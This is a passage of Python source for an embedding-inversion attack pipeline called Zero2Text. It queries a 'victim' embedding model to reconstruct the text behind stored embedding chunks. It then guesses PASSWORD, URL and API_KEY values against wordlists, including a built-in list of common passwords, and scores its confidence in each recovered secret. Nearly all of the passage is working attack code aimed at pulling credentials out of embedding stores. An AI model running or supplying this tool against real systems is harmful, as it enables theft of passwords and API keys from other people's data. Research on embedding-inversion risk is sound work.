                cand_embs = cand_embs_torch.cpu().numpy()

                # ---- Step 5: Diversity filter ----
                kept_indices = self._diversity_filter(cand_embs)
                if not kept_indices:
                    continue

                candidate_texts = [candidate_texts[i] for i in kept_indices]
                cand_embs = cand_embs[kept_indices]
                top_logit_values = top_logit_values[kept_indices]

                if len(candidate_texts) == 0:
                    continue

                # ---- Step 6: Query budget ----
                if t == 0:
                    n_queries = min(3 * self.k_a, len(candidate_texts))
                else:
                    n_queries = min(
                        int(self.k_a * (self.decay_gamma ** (t - 1))),
                        len(candidate_texts),
                    )
                n_queries = max(n_queries, 1)

                # ---- Step 7+: Scoring ----
                if self.dual_mode and W is not None:
                    # --- Dual mode with projection ---

                    # 7. Project local embeddings to victim space
                    projected = cand_embs @ W
                    projected_cos = self._cosine_sim_np(projected, target_np)

                    # 8. Hybrid rank -> select top n_queries
                    hybrid_rank = self._hybrid_score(
                        top_logit_values, projected_cos, confidence
                    )
                    query_indices = np.argsort(hybrid_rank)[::-1][:n_queries]

                    # 9. Query victim on selected candidates
                    query_texts = [candidate_texts[i] for i in query_indices]
                    victim_sims = self.engine.score_against_target(
                        query_texts, target_emb
                    )

                    # Get victim embeddings for projection update
                    query_local_embs = cand_embs[query_indices]
                    query_victim_embs = (
                        self.engine.get_embeddings_batch(query_texts)
                        .cpu().numpy()
                    )

                    # 10. Accumulate observations, update W, confidence
                    obs_local.append(query_local_embs)
                    obs_victim.append(query_victim_embs)

                    all_local = np.concatenate(obs_local, axis=0)
                    all_victim = np.concatenate(obs_victim, axis=0)

                    W = self._update_projection(all_local, all_victim)
                    confidence = self._compute_confidence(
                        all_local, all_victim, W
                    )

                    # 11. Final score = Z(logits) + Z(victim_cos)
                    query_logits = top_logit_values[query_indices]
                    final_scores = self._hybrid_score(
                        query_logits, np.array(victim_sims), confidence
                    )

                    for text, score in zip(query_texts, final_scores):
                        all_candidates.append((text, float(score)))

                else:
                    # --- Direct mode (or dual cold-start, W is None) ---

                    # Score ALL candidates with victim model
                    victim_sims = self.engine.score_against_target(
                        candidate_texts, target_emb
                    )
                    cos_sims = np.array(victim_sims)

                    # Hybrid score
                    hybrid = self._hybrid_score(
                        top_logit_values, cos_sims, confidence
                    )

                    for text, score in zip(candidate_texts, hybrid):
                        all_candidates.append((text, float(score)))

                    # In dual mode cold-start: collect observations to build W
                    if self.dual_mode:
                        victim_embs_np = (
                            self.engine.get_embeddings_batch(candidate_texts)
                            .cpu().numpy()
                        )
                        obs_local.append(cand_embs)
                        obs_victim.append(victim_embs_np)

            # -- End of beam loop --

            if not all_candidates:
                break

            # Build W after cold-start collection
            if self.dual_mode and W is None and obs_local:
                all_local = np.concatenate(obs_local, axis=0)
                all_victim = np.concatenate(obs_victim, axis=0)
                W = self._update_projection(all_local, all_victim)
                confidence = self._compute_confidence(
                    all_local, all_victim, W
                )
                if verbose:
                    print(f"    [Projection] Initial W built, "
                          f"confidence={confidence:.4f}")

            # Sort all candidates, keep top K_B as beams
            all_candidates.sort(key=lambda x: x[1], reverse=True)
            beams = all_candidates[:self.beam_width]

            # Re-score beams by actual victim cosine for tracking
            beam_texts = [txt for txt, _ in beams]
            beam_sims = self.engine.score_against_target(
                beam_texts, target_emb
            )

            # Track best
            current_best_sim = max(beam_sims) if beam_sims else 0.0
            current_best_idx = (
                beam_sims.index(current_best_sim) if beam_sims else 0
            )
            current_best_text = (
                beam_texts[current_best_idx] if beam_texts else ""
            )

            if current_best_sim > best_sim + 0.001:
                best_text = current_best_text
                best_sim = current_best_sim
                stagnation = 0
            else:
                stagnation += 1

            step_history.append({
                "step": t,
                "best_sim": best_sim,
                "beam_top_sim": current_best_sim,
                "confidence": confidence,
                "n_candidates": len(all_candidates),
            })

            # Always show compact progress
            print(f"    Step {t + 1}/{max_tokens} (sim={best_sim:.4f})...",
                  end="\r", flush=True)
            if verbose and t % 4 == 0:
                print(f"    [Step {t}] sim={best_sim:.4f} "
                      f"conf={confidence:.3f} "
                      f"cands={len(all_candidates)} "
                      f"\"{best_text[-50:]}\"")

            # Early stopping
            if best_sim > 0.95:
                print(f"    [Early stop] Similarity {best_sim:.4f} > 0.95"
                      + (" " * 30))
                break
            if stagnation >= 8:
                print(f"    [Early stop] Stagnation ({stagnation} steps)"
                      + (" " * 30))
                break

        print(f"    [Zero2Text done] {t + 1} steps, "
              f"similarity={best_sim:.4f}" + (" " * 30))
        if verbose and self.dual_mode:
            print(f"    [Projection] Final confidence={confidence:.4f}")

        return best_text, best_sim, step_history


# ============================================================================
# SECTION 6: SLOT RESULT + ENHANCED SLOT FILLER
# ============================================================================

@dataclass
class SlotResult:
    """Result of filling a single slot."""
    value: str
    similarity: float
    margin: float
    template_consensus: float
    confidence: str
    competing_values: List[Tuple[str, float]]
    z_score: float = 0.0
    z_gap: float = 0.0
    percentile: float = 0.0
    margin_z_score: float = 0.0
    margin_z_gap: float = 0.0
    raw_consensus: float = 0.0
    separation_ratio: float = 0.0      # Improvement 3: gap-based confidence


class EnhancedSlotFiller:
    """
    Enhanced slot filler with improvements over TopKSlotFiller:

    1. Margin-aware scoring  -- computes a neutral baseline per template
       and uses (raw_sim - baseline) margins for winner selection and
       z-score computation.

    2. Weighted consensus -- each template's vote is weighted by its
       base similarity to the target (better templates count more).

    3. Progressive fill-and-lock -- two-pass slot filling where Pass 1
       fills all slots independently, high-confidence results are locked,
       and Pass 2 re-fills weak slots with locked context.

    4. Two-stage narrowing (Improvement 2) -- coarse pass on top-3
       templates prunes wordlist before the full tournament.

    5. Gap-based confidence (Improvement 3) -- separation_ratio between
       best and second-best weighted scores for confidence classification.
    """

    DEFAULT_WORDLISTS = {
        "PASSWORD": [
            "Password123!", "Welcome123!", "Changeme1!", "TempPass1!",
            "Summer2024!", "Winter2024!", "Spring2024!", "Fall2024!",
            "Company123!", "Admin123!", "User12345!", "Secure123!",
            "Access2024!", "Login123!", "Reset123!", "Temp1234!",
        ],
        "URL": [
            "https://portal.company.com", "https://login.internal.com",
            "https://sso.corp.local", "https://auth.internal.net",
            "https://access.corp.com", "https://hr.company.com",
        ],
        "API_KEY": [
            "sk-prod-abc123", "sk-test-xyz789", "api-key-12345",
            "token-abcdef", "key-123456789",
        ],
    }

    def __init__(self, engine: EmbeddingEngine, config):
        self.engine = engine
        self.config = config
        self.wordlists = {}
        # Merge neutral defaults: built-in + user overrides
        self.neutral_defaults = dict(NEUTRAL_DEFAULTS)
        if getattr(config, 'neutral_defaults', None):
            self.neutral_defaults.update(config.neutral_defaults)
            pairs = ", ".join(f"{k}={v}" for k, v in config.neutral_defaults.items())
            print(f"[SlotFiller] Neutral defaults active: {pairs}")

    def load_wordlist(self, path: str, slot_type: str = "PASSWORD"):
        """Load external wordlist file."""
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            words = [line.strip() for line in f if line.strip()]
        self.wordlists[slot_type] = words
        print(f"[SlotFiller] Loaded {len(words):,} entries for {slot_type}")

    def _get_wordlist(self, slot_type: str) -> List[str]:
        if slot_type in self.wordlists:
            return self.wordlists[slot_type]
        if slot_type in self.DEFAULT_WORDLISTS:
            return self.DEFAULT_WORDLISTS[slot_type]
        return []

    def _coarse_stage(
        self,
        top_k_templates: List[Tuple[str, float]],
        slot_name: str,
        target_emb: torch.Tensor,
        wordlist: List[str],
        locked_values: Optional[Dict[str, str]] = None,
        n_coarse_templates: int = 3,
        top_n_per_template: int = 10,
        min_survivors: int = 200,
    ) -> List[str]:
        """
        Improvement 2 — Two-Stage Narrowing, Stage 1 (coarse).

        Run the full wordlist against only the top n_coarse_templates
        (by base_similarity).  Track which values ever appeared in the
        top-N by margin for any template.  Collect all such values into
        a survivors set.  Always include at least min_survivors unique
        candidates.

        Returns:
            List of surviving wordlist values for Stage 2.
        """
        placeholder = "{" + slot_name + "}"

        # Only use templates that contain this slot
        valid = [(t, s) for t, s in top_k_templates if placeholder in t]
        if not valid:
            return wordlist

        # Take only the top n_coarse_templates by base_similarity
        coarse_templates = valid[:n_coarse_templates]

        # Track: value -> best margin seen across coarse templates
        value_best_margin: Dict[str, float] = {}
        survivors_set: set = set()

        for idx, (template, base_similarity) in enumerate(coarse_templates):
            print(f"    [Coarse] Template {idx + 1}/{len(coarse_templates)} "
                  f"({len(wordlist):,} candidates)...",
                  end="\r", flush=True)

            # Pre-fill other placeholders
            prefilled = template
            for other_slot in re.findall(r'\{([A-Z_]+)\}', template):
                if other_slot != slot_name:
                    other_ph = "{" + other_slot + "}"
                    if locked_values and other_slot in locked_values:
                        default_val = locked_values[other_slot]
                    else:
                        default_val = self.neutral_defaults.get(other_slot, "example")
                    prefilled = prefilled.replace(other_ph, default_val)

            # Compute baseline
            baseline_text = prefilled.replace(
                placeholder,
                self.neutral_defaults.get(slot_name, "example")
            )
            baseline_sim = self.engine.compute_similarity(baseline_text, target_emb)

            # Score all candidates
            texts = [prefilled.replace(placeholder, v) for v in wordlist]
            raw_sims = self.engine.score_against_target(texts, target_emb)
            margin_sims = [s - baseline_sim for s in raw_sims]

            # Track best margin per value
            for v, m in zip(wordlist, margin_sims):
                if v not in value_best_margin or m > value_best_margin[v]:
                    value_best_margin[v] = m

            # Find top-N by margin for this template
            sorted_pairs = sorted(
                zip(wordlist, margin_sims), key=lambda x: x[1], reverse=True
            )
            for v, _ in sorted_pairs[:top_n_per_template]:
                survivors_set.add(v)

        print()

        # If we have fewer than min_survivors, add the globally best by margin
        if len(survivors_set) < min_survivors:
            sorted_global = sorted(
                value_best_margin.items(), key=lambda x: x[1], reverse=True
            )
            for v, _ in sorted_global:
                survivors_set.add(v)
                if len(survivors_set) >= min_survivors:
                    break

        survivors = [v for v in wordlist if v in survivors_set]

        print(f"    [Coarse] Stage 1 complete: {len(survivors)} survivors "
              f"from {len(wordlist):,} candidates")

        return survivors

    def fill_slot(
        self,
        top_k_templates: List[Tuple[str, float]],
        slot_name: str,
        target_emb: torch.Tensor,
        locked_values: Optional[Dict[str, str]] = None,
    ) -> SlotResult:
        """
        Fill a single slot using top-K templates with margin-aware scoring
        and weighted consensus.

        Improvement 2: Two-stage narrowing — coarse pass on top-3 templates
        followed by full tournament on survivors only.

        Improvement 3: Gap-based confidence with separation_ratio.
        """

        wordlist = self._get_wordlist(slot_name)
        if not wordlist:
            return SlotResult(
                value=f"[NO_WORDLIST_{slot_name}]",
                similarity=0.0, margin=0.0, template_consensus=0.0,
                confidence="NO_WORDLIST", competing_values=[],
                separation_ratio=0.0,
            )

        placeholder = "{" + slot_name + "}"

        # Only use templates that contain this slot
        valid = [(t, s) for t, s in top_k_templates if placeholder in t]
        if not valid:
            return SlotResult(
                value=f"[NO_TEMPLATE_{slot_name}]",
                similarity=0.0, margin=0.0, template_consensus=0.0,
                confidence="NO_TEMPLATE", competing_values=[],
                separation_ratio=0.0,
            )

        # --- Improvement 2: Two-Stage Narrowing ---
        # Only apply two-stage narrowing when the wordlist is large enough
        # and we have enough templates for the coarse stage to be meaningful
        if len(wordlist) > 200 and len(valid) > 3:
            print(f"    [Two-Stage] Running coarse pass on {len(wordlist):,} candidates...")
            survivors = self._coarse_stage(
                top_k_templates, slot_name, target_emb, wordlist,
                locked_values=locked_values,
                n_coarse_templates=3,
                top_n_per_template=10,
                min_survivors=200,
            )
            effective_wordlist = survivors
            print(f"    [Two-Stage] Stage 2: full tournament on {len(effective_wordlist)} survivors "
                  f"across {len(valid)} templates")
        else:
            effective_wordlist = wordlist

        # --- Per-template tournament (Stage 2 / full) ---
        template_winners = []
        all_value_scores = {v: [] for v in effective_wordlist}
        all_value_margin_scores = {v: [] for v in effective_wordlist}

        for idx, (template, base_similarity) in enumerate(valid):
            print(f"    Template {idx + 1}/{len(valid)} ({len(effective_wordlist):,} candidates)...",
                  end="\r", flush=True)

            # Pre-fill all OTHER placeholders with locked values or neutral defaults
            prefilled = template
            for other_slot in re.findall(r'\{([A-Z_]+)\}', template):
                if other_slot != slot_name:
                    other_ph = "{" + other_slot + "}"
                    if locked_values and other_slot in locked_values:
                        default_val = locked_values[other_slot]
                    else:
                        default_val = self.neutral_defaults.get(other_slot, "example")
                    prefilled = prefilled.replace(other_ph, default_val)

            # Compute baseline: template with ALL slots neutral-filled (including target)
            baseline_text = prefilled.replace(
                placeholder,
                self.neutral_defaults.get(slot_name, "example")
            )
            baseline_sim = self.engine.compute_similarity(baseline_text, target_emb)

            # Score candidates (raw similarities)
            texts = [prefilled.replace(placeholder, v) for v in effective_wordlist]
            raw_sims = self.engine.score_against_target(texts, target_emb)

            # Margin scores: improvement over neutral baseline
            margin_sims = [s - baseline_sim for s in raw_sims]

            # Winner selection uses margin_sims (largest margin wins)
            sorted_by_margin = sorted(
                zip(effective_wordlist, raw_sims, margin_sims),
                key=lambda x: x[2],
                reverse=True,
            )
            winner_value = sorted_by_margin[0][0]
            winner_sim = sorted_by_margin[0][1]
            winner_margin = sorted_by_margin[0][2]
            second_margin = sorted_by_margin[1][2] if len(sorted_by_margin) > 1 else 0.0
            raw_margin = winner_margin - second_margin

            template_winners.append((
                template, winner_value, winner_sim, raw_margin,
                winner_margin, base_similarity,
            ))

            for value, sim, msim in zip(effective_wordlist, raw_sims, margin_sims):
                all_value_scores[value].append(sim)
                all_value_margin_scores[value].append(msim)

        print()

        # --- Cross-template weighted consensus ---
        value_wins: Dict[str, Dict[str, Any]] = {}
        for _, winner, sim, raw_margin, winner_margin, base_sim in template_winners:
            if winner not in value_wins:
                value_wins[winner] = {
                    "count": 0, "weight": 0.0,
                    "sims": [], "margins": [], "margin_scores": [],
                }
            value_wins[winner]["count"] += 1
            value_wins[winner]["weight"] += base_sim
            value_wins[winner]["sims"].append(sim)
            value_wins[winner]["margins"].append(raw_margin)
            value_wins[winner]["margin_scores"].append(winner_margin)

        # Best value by weighted vote
        best_value = max(value_wins.keys(), key=lambda v: value_wins[v]["weight"])
        best_info = value_wins[best_value]

        # Weighted consensus
        total_weight = sum(info["weight"] for info in value_wins.values())
        weighted_consensus = best_info["weight"] / total_weight if total_weight > 0 else 0.0
        raw_consensus = best_info["count"] / len(valid)

        avg_sim = float(np.mean(best_info["sims"]))
        avg_margin = float(np.mean(best_info["margins"]))

        competing = sorted(
            [(v, float(np.mean(all_value_scores[v]))) for v in effective_wordlist if v != best_value],
            key=lambda x: x[1], reverse=True
        )[:5]

        # --- Z-score: raw similarities ---
        avg_sims_per_value = [float(np.mean(all_value_scores[v])) for v in effective_wordlist]
        avg_sims_array = np.array(avg_sims_per_value)

        sim_mean = float(np.mean(avg_sims_array))
        sim_std = float(np.std(avg_sims_array))

        if sim_std > 1e-9:
            z_score = (avg_sim - sim_mean) / sim_std
        else:
            z_score = 0.0

        sorted_avg_sims = sorted(avg_sims_per_value, reverse=True)
        second_avg_sim = sorted_avg_sims[1] if len(sorted_avg_sims) > 1 else sim_mean
        if sim_std > 1e-9:
            z_gap = (avg_sim - second_avg_sim) / sim_std
        else:
            z_gap = 0.0

        percentile = float(np.mean(avg_sims_array < avg_sim)) * 100.0

        # --- Z-score: margin-based ---
        avg_margins_per_value = [float(np.mean(all_value_margin_scores[v])) for v in effective_wordlist]
        avg_margins_array = np.array(avg_margins_per_value)

        margin_mean = float(np.mean(avg_margins_array))
        margin_std = float(np.std(avg_margins_array))

        best_avg_margin_score = float(np.mean(best_info["margin_scores"])) if best_info["margin_scores"] else 0.0

        if margin_std > 1e-9:
            margin_z_score = (best_avg_margin_score - margin_mean) / margin_std
        else:
            margin_z_score = 0.0

        sorted_avg_margins = sorted(avg_margins_per_value, reverse=True)
        second_avg_margin = sorted_avg_margins[1] if len(sorted_avg_margins) > 1 else margin_mean
        if margin_std > 1e-9:
            margin_z_gap = (best_avg_margin_score - second_avg_margin) / margin_std
        else:
            margin_z_gap = 0.0

        # --- Improvement 3: Gap-Based Confidence with separation_ratio ---
        effective_z = max(z_score, margin_z_score)
        effective_gap = max(z_gap, margin_z_gap)
        consensus = weighted_consensus

        # Calculate separation_ratio
        best_weight = best_info["weight"]
        # Find second-best by weight
        second_best_weight = 0.0
        for v, info in value_wins.items():
            if v != best_value:
                if info["weight"] > second_best_weight:
                    second_best_weight = info["weight"]

        if second_best_weight > 0:
            separation_ratio = best_weight / second_best_weight
        else:
            separation_ratio = float('inf')

        # New confidence tiers (Improvement 3)
        if (separation_ratio >= 3.0 and raw_consensus >= 0.6):
            conf = "HIGH"
        elif (effective_z > 4.0 and effective_gap > 1.5):
            conf = "HIGH"
        elif (separation_ratio >= 1.8 and raw_consensus >= 0.4):
            conf = "MEDIUM"
        elif (effective_z > 2.5 and consensus >= 0.7):
            conf = "MEDIUM"
        elif (separation_ratio >= 1.3) or (effective_z > 2.0 and raw_consensus >= 0.3):
            conf = "LOW"
        else:
            conf = "LIKELY_FALSE_POSITIVE"

        return SlotResult(
            value=best_value,
            similarity=avg_sim,
            margin=avg_margin,
            template_consensus=weighted_consensus,
            confidence=conf,
            competing_values=competing,
            z_score=z_score,
            z_gap=z_gap,
            percentile=percentile,
            margin_z_score=margin_z_score,
            margin_z_gap=margin_z_gap,
            raw_consensus=raw_consensus,
            separation_ratio=separation_ratio,
        )

    def fill_all_slots(
        self,
        top_k_templates: List[Tuple[str, float]],
        target_emb: torch.Tensor,
    ) -> Dict[str, Any]:
        """
        Fill all (or filtered) slots with progressive fill-and-lock.

        Pass 1: fill all slots independently.
        Pass 2: lock high-confidence slots, re-fill weak slots with
                 locked context.  Only update if the new result improves.
        """

        # Discover all slots in top-K templates
        all_slots = set()
        for t, _ in top_k_templates:
            all_slots.update(re.findall(r'\{([A-Z_]+)\}', t))

        # Filter to target slots if specified
        if self.config.target_slots:
            all_slots = all_slots & set(self.config.target_slots)

        if not all_slots:
            return {
                "filled_template": top_k_templates[0][0],
                "slots": {},
                "high_confidence_slots": [],
                "likely_false_positives": [],
            }

        # --- Pass 1: fill all slots independently ---
        results: Dict[str, SlotResult] = {}
        for slot in sorted(all_slots):
            print(f"\n  [Slot: {slot}] Pass 1 -- testing across "
                  f"{len(top_k_templates)} seed templates...")

            results[slot] = self.fill_slot(top_k_templates, slot, target_emb)

        # --- Determine locks ---
        locked = {
            s: r.value
            for s, r in results.items()
            if r.z_score > 2.0 and r.confidence != "LIKELY_FALSE_POSITIVE"
        }

        # --- Pass 2: re-fill non-locked slots with locked context ---
        if locked:
            locked_display = ", ".join(f"{s}={v}" for s, v in locked.items())
            print(f"\n  [Progressive] Locked slots: {locked_display}")

            for slot in sorted(all_slots):
                if slot not in locked:
                    print(f"\n  [Slot: {slot}] Pass 2 -- re-filling with "
                          f"locked context...")

                    new_result = self.fill_slot(
                        top_k_templates, slot, target_emb,
                        locked_values=locked,
                    )
                    # Only update if improved
                    if new_result.z_score > results[slot].z_score:
                        if self.config.verbose:
                            print(f"    Improved: z_score {results[slot].z_score:.2f}"
                                  f" -> {new_result.z_score:.2f}")
                        results[slot] = new_result
                    else:
                        if self.config.verbose:
                            print(f"    No improvement (z_score {new_result.z_score:.2f}"
                                  f" <= {results[slot].z_score:.2f}), keeping Pass 1 result")

        # --- Build output dict ---
        output_slots = {}
        for slot, result in results.items():
            output_slots[slot] = {
                "value": result.value,
                "similarity": result.similarity,
                "margin": result.margin,
                "consensus": result.template_consensus,
                "raw_consensus": result.raw_consensus,
                "confidence": result.confidence,
                "competing": result.competing_values[:3],
                "z_score": result.z_score,
                "z_gap": result.z_gap,
                "percentile": result.percentile,
                "margin_z_score": result.margin_z_score,
                "margin_z_gap": result.margin_z_gap,
                "separation_ratio": result.separation_ratio,
            }

        # Build filled template from the best-matching template
        filled_template = top_k_templates[0][0]
        for slot, info in output_slots.items():
            if info["confidence"] != "LIKELY_FALSE_POSITIVE":
                filled_template = filled_template.replace("{" + slot + "}", info["value"])

        return {
            "filled_template": filled_template,
            "slots": output_slots,
            "high_confidence_slots": [s for s, i in output_slots.items()
                                      if i["confidence"] == "HIGH"],
            "likely_false_positives": [s for s, i in output_slots.items()
                                       if i["confidence"] == "LIKELY_FALSE_POSITIVE"],
        }


# ============================================================================
# SECTION 7: ZERO2TEXT PIPELINE (Orchestrator)
# ============================================================================

class Zero2TextPipeline:
    """
    Orchestrates the full Zero2Text attack pipeline:

      Stage 1: Zero2Text inversion -> approximate text (always runs)
      Stage 2: Entropy detection on recovered text
      Stage 3: Dynamic template creation (if high-entropy found)
      Stage 4: Template bank scoring -> top-K with relative threshold
               (Improvement 4) + diversity clustering (Improvement 1)
      Stage 5: Enhanced slot filling (margin-aware, weighted, progressive,
               two-stage narrowing, gap-based confidence)
    """

    def __init__(self, config):
        self.config = config
        self.engine = EmbeddingEngine(
            config.embedding_model,
            config.device,
            config.batch_size,
        )

    def attack_chunk(
        self,
        target_embedding: np.ndarray,
        chunk_idx: int = 0,
    ) -> Dict[str, Any]:
        """Execute the full pipeline on a single embedding chunk."""

        target_emb = torch.tensor(
            target_embedding, dtype=torch.float32
        ).to(self.engine.device)

        result: Dict[str, Any] = {
            "chunk_idx": chunk_idx,
            "timestamp": datetime.now().isoformat(),
        }

        print(f"\n[Chunk {chunk_idx}]")

        templates, source = TemplateLoader.load(
            bank_path=self.config.bank_path,
            templates_json=self.config.templates_json,
            max_templates=self.config.max_templates,
        )
        print(f"  Templates: {len(templates):,} ({source})")

        # --- Improvement 4: Relative threshold template selection ---
        top_k = self.engine.find_top_k(
            templates, target_emb,
            top_k=self.config.top_k,
            verbose=self.config.verbose,
            similarity_floor_pct=self.config.similarity_floor_pct,
            max_seeds=self.config.max_seeds,
            min_seeds=self.config.min_seeds,
        )

        print(f"  Inverting (max_tokens={self.config.max_tokens})...")

        # Prepare seeds: top-5 templates with neutral-filled slots
        seeds = None
        if top_k:
            seeds = []
            for t, s in top_k[:5]:
                filled = t
                for slot in re.findall(r'\{([A-Z_]+)\}', t):
                    nd = NEUTRAL_DEFAULTS.get(slot, "example")
                    if (self.config.neutral_defaults
                            and slot in self.config.neutral_defaults):
                        nd = self.config.neutral_defaults[slot]
                    filled = filled.replace("{" + slot + "}", nd)
                seeds.append(filled)

        inverter = Zero2TextInverter(
            self.engine,
            lm_model_name=self.config.lm_model,
            local_model_name=self.config.local_model,
            beam_width=self.config.beam_width,
            k_s=self.config.k_s,
            k_a=self.config.k_a,
            max_tokens=self.config.max_tokens,
            diversity_threshold=self.config.z2t_diversity_threshold,
            ridge_lambda=self.config.ridge_lambda,
            decay_gamma=self.config.decay_gamma,
        )

        z2t_text, z2t_sim, z2t_history = inverter.invert(
            target_emb, seed_texts=seeds, verbose=self.config.verbose,
        )

        result["zero2text"] = {
            "text": z2t_text,
            "similarity": z2t_sim,
            "steps": len(z2t_history),
            "history": z2t_history,
            "mode": "dual" if self.config.local_model else "direct",
        }

        print(f"  Inversion: {z2t_sim*100:.1f}% similarity")

        print(f"  Entropy analysis...")

        regions = detect_high_entropy_regions(
            z2t_text,
            entropy_threshold=self.config.entropy_threshold,
        )

        dynamic_template = None
        if regions:
            print(f"    Found {len(regions)} high-entropy region(s)")
            if self.config.verbose:
                for r in regions:
                    print(f"      [{r['slot_type']}] \"{r['token']}\" "
                          f"(entropy={r['entropy']:.2f})")

            dynamic_template, slot_map = create_dynamic_template(
                z2t_text, regions,
            )

            if self.config.verbose:
                print(f"  Dynamic template: {dynamic_template}")

            result["entropy_detection"] = {
                "regions": [{
                    "token": r["token"],
                    "entropy": r["entropy"],
                    "slot_type": r["slot_type"],
                } for r in regions],
                "dynamic_template": dynamic_template,
                "original_values": slot_map,
            }
        else:
            print(f"    No high-entropy regions found")

        print(f"  Template pool (top-{len(top_k)})...")

        if dynamic_template:
            dyn_sim = self.engine.compute_similarity(
                dynamic_template, target_emb
            )
            top_k.append((dynamic_template, dyn_sim))
            top_k.sort(key=lambda x: x[1], reverse=True)
            # Cap to max_seeds after merging dynamic template
            top_k = top_k[:self.config.max_seeds]

            if self.config.verbose:
                print(f"    Dynamic template merged (sim={dyn_sim:.4f})")

        # --- Improvement 1: Template Diversity Clustering ---
        pool_size_before = len(top_k)
        top_k = self.engine.select_diverse_templates(
            top_k, target_emb,
            diversity_threshold=self.config.diversity_threshold,
            min_diverse=5,
        )
        print(f"  Selected {len(top_k)} diverse templates from top-{pool_size_before}")

        result["template_source"] = source
        result["templates_scored"] = len(templates)
        result["top_k"] = [
            {"template": t, "similarity": s} for t, s in top_k[:5]
        ]

        if self.config.verbose:
            print(f"\n    Top-{len(top_k)} templates:")
            for i, (t, s) in enumerate(top_k[:5]):
                print(f"      {i+1}. [{s:.4f}] {t[:65]}...")
            if len(top_k) > 5:
                print(f"      ... ({len(top_k) - 5} more)")

        print(f"  Slot filling...")

        filler = EnhancedSlotFiller(self.engine, self.config)
        if self.config.wordlist_path:
            filler.load_wordlist(self.config.wordlist_path)

        slot_results = filler.fill_all_slots(top_k, target_emb)

        result["slot_filling"] = {
            "top_k_count": len(top_k),
            "top_1_similarity": top_k[0][1] if top_k else 0,
            "top_1_template": top_k[0][0] if top_k else "",
            "filled_template": slot_results.get("filled_template", ""),
            "slots": slot_results.get("slots", {}),
            "high_confidence_slots": slot_results.get("high_confidence_slots", []),
            "likely_false_positives": slot_results.get("likely_false_positives", []),
        }

        self._print_summary(result, top_k, slot_results)

        return result

    def _print_summary(
        self,
        result: Dict,
        top_k: List[Tuple[str, float]],
        slot_results: Dict,
    ):
        """Print pipeline summary."""
        verbose = self.config.verbose
        print(f"\n--- Chunk {result['chunk_idx']} ---")

        z2t = result.get("zero2text")
        if z2t:
            print(f"\n  Text inversion ({z2t['similarity']*100:.1f}% similarity):")
            print(f"    \"{z2t['text'][:70]}...\"")

        ent = result.get("entropy_detection")
        if ent:
            regions = ent.get("regions", [])
            if regions:
                print(f"\n  Entropy: {len(regions)} high-entropy region(s) detected")

        sf = result.get("slot_filling", {})
        if sf.get("slots"):
            sim = sf.get("top_1_similarity", 0)
            t1 = sf.get("top_1_template", "")
            print(f"\n  Best template match ({sim*100:.1f}% similarity):")
            print(f"    \"{t1[:70]}...\"")

            n_templates = sf.get("top_k_count", 0)
            print(f"\n  Extracted values:")
            for slot, info in sf["slots"].items():
                conf = info.get("confidence", "?")
                rc = info.get("raw_consensus", 0)
                sep_ratio = info.get("separation_ratio", 0.0)
                label = _user_confidence(conf, rc, n_templates, sep_ratio)
                print(f"    {slot} = {info['value']}")
                print(f"      {label}")
                if verbose:
                    wc = info.get("consensus", 0)
                    z = info.get("z_score", 0)
                    zg = info.get("z_gap", 0)
                    mz = info.get("margin_z_score", 0)
                    mgz = info.get("margin_z_gap", 0)
                    margin = info.get("margin", 0)
                    print(f"      [tier={conf} z={z:.2f} gap={zg:.2f} mz={mz:.2f} "
                          f"mgap={mgz:.2f} wcons={wc:.0%} rcons={rc:.0%} "
                          f"margin={margin:.4f} sep_ratio={sep_ratio:.1f}x]")
                if sf.get("filled_template"):
                    print(f"      Reconstructed: \"{sf['filled_template'][:70]}...\"")
        else:
            print(f"\n  No slots filled")

    def attack_chunks(
        self,
        embeddings: np.ndarray,
        chunk_indices: List[int],
    ) -> List[Dict[str, Any]]:
        """Attack multiple chunks."""
        results = []
        for idx in chunk_indices:
            if idx >= len(embeddings):
                print(f"[!] Chunk {idx} out of range (max {len(embeddings)-1})")
                continue
            results.append(self.attack_chunk(embeddings[idx], chunk_idx=idx))
        return results


# ============================================================================
# SECTION 8: CONFIGURATION
# ============================================================================

@dataclass
class Zero2TextConfig:
    """Configuration for the Improved Zero2Text pipeline."""

    embedding_model: str = "sentence-transformers/all-MiniLM-L6-v2"
    device: str = "auto"
    batch_size: int = 256

    # Template sources
    bank_path: Optional[str] = None
    templates_json: Optional[str] = None
    max_templates: int = 100000

    # Top-K (legacy; see relative threshold fields below)
    top_k: int = 20

    # Improvement 4: Relative threshold for template selection
    similarity_floor_pct: float = 0.85
    max_seeds: int = 50
    min_seeds: int = 5

    # Improvement 1: Template diversity clustering threshold
    diversity_threshold: float = 0.85

    # Zero2Text hyperparameters
    lm_model: str = "gpt2"
    local_model: Optional[str] = None      # enables dual-embedder mode
    beam_width: int = 10                    # K_B
    k_s: int = 1000                         # K_S (candidates per beam)
    k_a: int = 50                           # K_A (query budget)
    max_tokens: int = 32                    # T (generation steps)
    z2t_diversity_threshold: float = 0.9    # Thw (Zero2Text beam diversity)
    ridge_lambda: float = 0.1
    decay_gamma: float = 0.8

    # Slot filling
    wordlist_path: Optional[str] = None
    target_slots: Optional[List[str]] = None
    neutral_defaults: Optional[Dict[str, str]] = None

    # Entropy
    entropy_threshold: float = 3.5

    verbose: bool = False


# ============================================================================
# SECTION 9: OUTPUT FORMATTER
# ============================================================================

def _user_confidence(
    conf: str,
    rcons: float = 0,
    n_templates: int = 0,
    separation_ratio: float = 0.0,
) -> str:
    """
    Map internal tier to user-friendly strength label with agreement info.

    Improvement 3: includes separation_ratio in output when available.
    """
    agrees = round(rcons * n_templates) if n_templates else 0
    ratio_str = ""
    if separation_ratio and separation_ratio != float('inf') and separation_ratio > 0:
        ratio_str = f", {separation_ratio:.1f}x ahead of runner-up"
    elif separation_ratio == float('inf'):
        ratio_str = ", no runner-up"

    if conf == "HIGH":
        if n_templates:
            return f"Strong — {agrees}/{n_templates} templates agree{ratio_str}"
        return "Strong"
    elif conf == "MEDIUM":
        if n_templates:
            return f"Moderate — {agrees}/{n_templates} templates agree{ratio_str}, worth verifying"
        return "Moderate — worth verifying"
    elif conf == "LOW":
        if rcons >= 0.7 and n_templates:
            return f"Likely — {agrees}/{n_templates} templates agree{ratio_str}"
        elif n_templates:
            return f"Weak — {agrees}/{n_templates} templates agree{ratio_str}"
        return "Weak"
    else:
        return "Unlikely — insufficient evidence"


def _result_marker(conf: str) -> str:
    """Return marker for result line."""
    if conf == "HIGH":
        return "+++"
    elif conf == "MEDIUM":
        return " ++"
    elif conf == "LOW":
        return "  +"
    else:
        return "  -"


def _format_number(n) -> str:
